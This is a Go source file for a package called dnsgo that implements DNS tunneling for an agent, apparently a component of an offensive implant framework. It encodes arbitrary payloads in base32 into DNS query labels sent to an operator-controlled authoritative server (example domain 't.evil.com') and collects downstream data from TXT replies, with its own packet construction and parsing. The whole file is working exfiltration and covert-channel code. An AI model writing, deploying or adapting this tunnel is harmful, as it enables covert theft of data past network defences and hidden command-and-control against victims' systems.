// Package dnsgo implements DNS primitives on the agent. Go analogue of
// Program/dns/. First piece: DNS tunneling — exfil via TXT/A queries to
// an authoritative server the operator controls.
//
// Wire format (same shape as the Python side):
//
//	A query name: <base32-chunk>.<session-id>.<domain>
//	Each label is up to 63 chars; base32 alphabet is DNS-safe (A-Z, 2-7).
//	Server responds with TXT payloads carrying downstream data back.
//
// The client encodes a payload into base32, chunks it into labels, and
// fires one query per chunk. The server (running on the operator's box)
// decodes the labels and replies with whatever it has queued.
package dnsgo

import (
	"context"
	"encoding/base32"
	"encoding/binary"
	"errors"
	"fmt"
	"math/rand"
	"net"
	"strings"
	"time"
)

// Options controls a tunnel send.
type Options struct {
	Server  string        // resolver or authoritative IP
	Port    int           // 53 default
	Domain  string        // suffix — e.g. "t.evil.com"
	Session string        // 8-char session id
	Timeout time.Duration // per query
}

func defaults(opts Options) Options {
	if opts.Port == 0 {
		opts.Port = 53
	}
	if opts.Timeout == 0 {
		opts.Timeout = 3 * time.Second
	}
	if opts.Session == "" {
		opts.Session = randomSession()
	}
	return opts
}

// randomSession returns an 8-char base32 session id.
func randomSession() string {
	b := make([]byte, 5)
	_, _ = rand.Read(b)
	enc := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(b)
	return strings.ToLower(enc)[:8]
}

// EncodeName builds a query name from a chunk + session + domain.
func EncodeName(chunk []byte, session, domain string) (string, error) {
	enc := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(chunk)
	// chunk into 60-char labels
	var labels []string
	for i := 0; i < len(enc); i += 60 {
		end := i + 60
		if end > len(enc) {
			end = len(enc)
		}
		labels = append(labels, enc[i:end])
	}
	labels = append(labels, session)
	labels = append(labels, domain)
	name := strings.Join(labels, ".")
	if len(name) > 253 {
		return "", errors.New("dnsgo: encoded name > 253 chars, split the payload")
	}
	return name, nil
}

// DecodeName reverses EncodeName: given a query name and the domain, pull
// out the session and the decoded chunk.
func DecodeName(name, domain string) (session string, chunk []byte, err error) {
	name = strings.TrimSuffix(name, ".")
	domain = strings.TrimSuffix(domain, ".")
	domParts := strings.Split(domain, ".")
	nameParts := strings.Split(name, ".")
	if len(nameParts) < len(domParts)+2 {
		return "", nil, errors.New("dnsgo: name too short for domain + session + chunk")
	}
	domStart := len(nameParts) - len(domParts)
	for i := 0; i < len(domParts); i++ {
		if !strings.EqualFold(nameParts[domStart+i], domParts[i]) {
			return "", nil, errors.New("dnsgo: name does not match domain")
		}
	}
	session = nameParts[domStart-1]
	chunkLabels := nameParts[:domStart-1]
	encoded := strings.ToUpper(strings.Join(chunkLabels, ""))
	raw, err := base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(encoded)
	if err != nil {
		return session, nil, fmt.Errorf("dnsgo: base32 decode: %w", err)
	}
	return session, raw, nil
}

// SendResult is one query's outcome.
type SendResult struct {
	Question string
	Reply    []byte
	Err      error
}

// Send encodes payload and fires one DNS query per chunk. For each chunk,
// the server's TXT reply is collected into the returned reply buffer.
func Send(ctx context.Context, opts Options, payload []byte) ([]byte, []SendResult, error) {
	opts = defaults(opts)
	if opts.Server == "" {
		return nil, nil, errors.New("dnsgo: server required")
	}
	if opts.Domain == "" {
		return nil, nil, errors.New("dnsgo: domain required")
	}

	// split payload into 30-byte chunks (each produces a ~48-char base32
	// label, well under the 63-char limit)
	const chunkSize = 30
	var results []SendResult
	var replyBuf []byte

	for offset := 0; offset < len(payload); offset += chunkSize {
		end := offset + chunkSize
		if end > len(payload) {
			end = len(payload)
		}
		name, err := EncodeName(payload[offset:end], opts.Session, opts.Domain)
		if err != nil {
			return replyBuf, results, err
		}
		reply, err := queryTXT(ctx, opts.Server, opts.Port, name, opts.Timeout)
		results = append(results, SendResult{Question: name, Reply: reply, Err: err})
		if err == nil {
			replyBuf = append(replyBuf, reply...)
		}
	}
	return replyBuf, results, nil
}

// queryTXT sends one TXT query for name to server:port and returns the
// concatenated rdata from the first answer record.
func queryTXT(ctx context.Context, server string, port int, name string, timeout time.Duration) ([]byte, error) {
	// build a minimal DNS query
	qname, err := encodeQName(name)
	if err != nil {
		return nil, err
	}
	qid := uint16(rand.Intn(65536))
	hdr := make([]byte, 12)
	binary.BigEndian.PutUint16(hdr[0:2], qid)
	binary.BigEndian.PutUint16(hdr[2:4], 0x0100) // standard query, RD=1
	binary.BigEndian.PutUint16(hdr[4:6], 1)      // qdcount
	// qtype TXT (16), qclass IN (1)
	q := append(qname, 0x00, 0x10, 0x00, 0x01)
	packet := append(hdr, q...)

	addr := fmt.Sprintf("%s:%d", server, port)
	d := net.Dialer{Timeout: timeout}
	conn, err := d.DialContext(ctx, "udp", addr)
	if err != nil {
		return nil, err
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(timeout))
	if _, err := conn.Write(packet); err != nil {
		return nil, err
	}
	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil {
		return nil, err
	}
	return parseTXTResponse(buf[:n])
}

// encodeQName encodes a name into DNS label form (length-prefixed labels
// followed by a zero byte).
func encodeQName(name string) ([]byte, error) {
	out := make([]byte, 0, len(name)+2)
	for _, label := range strings.Split(name, ".") {
		if len(label) == 0 {
			return nil, errors.New("dnsgo: empty label in name")
		}
		if len(label) > 63 {
			return nil, fmt.Errorf("dnsgo: label too long: %d chars", len(label))
		}
		out = append(out, byte(len(label)))
		out = append(out, label...)
	}
	out = append(out, 0)
	return out, nil
}

// decodeQName decodes labels starting at offset. Handles pointer compression.
func decodeQName(buf []byte, off int) (string, int, error) {
	var labels []string
	ptrCount := 0
	origOff := -1
	for {
		if off >= len(buf) {
			return "", 0, errors.New("dnsgo: qname overrun")
		}
		b := buf[off]
		if b == 0 {
			off++
			if origOff >= 0 {
				return strings.Join(labels, "."), origOff, nil
			}
			return strings.Join(labels, "."), off, nil
		}
		if b&0xC0 == 0xC0 {
			if off+1 >= len(buf) {
				return "", 0, errors.New("dnsgo: truncated compression pointer")
			}
			ptr := int(binary.BigEndian.Uint16(buf[off:off+2]) & 0x3FFF)
			if origOff < 0 {
				origOff = off + 2
			}
			off = ptr
			ptrCount++
			if ptrCount > 16 {
				return "", 0, errors.New("dnsgo: too many compression pointers")
			}
			continue
		}
		off++
		if off+int(b) > len(buf) {
			return "", 0, errors.New("dnsgo: label overruns buffer")
		}
		labels = append(labels, string(buf[off:off+int(b)]))
		off += int(b)
	}
}

// parseTXTResponse walks a DNS response and extracts the TXT rdata from
// the first answer record.
func parseTXTResponse(buf []byte) ([]byte, error) {
	if len(buf) < 12 {
		return nil, errors.New("dnsgo: short DNS response")
	}
	qd := int(binary.BigEndian.Uint16(buf[4:6]))
	an := int(binary.BigEndian.Uint16(buf[6:8]))
	off := 12

	// skip questions
	for i := 0; i < qd; i++ {
		_, noff, err := decodeQName(buf, off)
		if err != nil {
			return nil, err
		}
		off = noff + 4 // qtype + qclass
	}

	// walk answers
	for i := 0; i < an; i++ {
		_, noff, err := decodeQName(buf, off)
		if err != nil {
			return nil, err
		}
		off = noff
		if off+10 > len(buf) {
			return nil, errors.New("dnsgo: truncated answer")
		}
		atype := binary.BigEndian.Uint16(buf[off : off+2])
		// skip class(2) ttl(4)
		rdlen := int(binary.BigEndian.Uint16(buf[off+8 : off+10]))
		off += 10
		if off+rdlen > len(buf) {
			return nil, errors.New("dnsgo: rdata overruns buffer")
		}
		if atype == 16 { // TXT
			// rdata is a sequence of length-prefixed strings; concatenate
			rdata := buf[off : off+rdlen]
			var out []byte
			j := 0
			for j < len(rdata) {
				l := int(rdata[j])
				j++
				if j+l > len(rdata) {
					break
				}
				out = append(out, rdata[j:j+l]...)
				j += l
			}
			return out, nil
		}
		off += rdlen
	}
	return nil, errors.New("dnsgo: no TXT answer found")
}
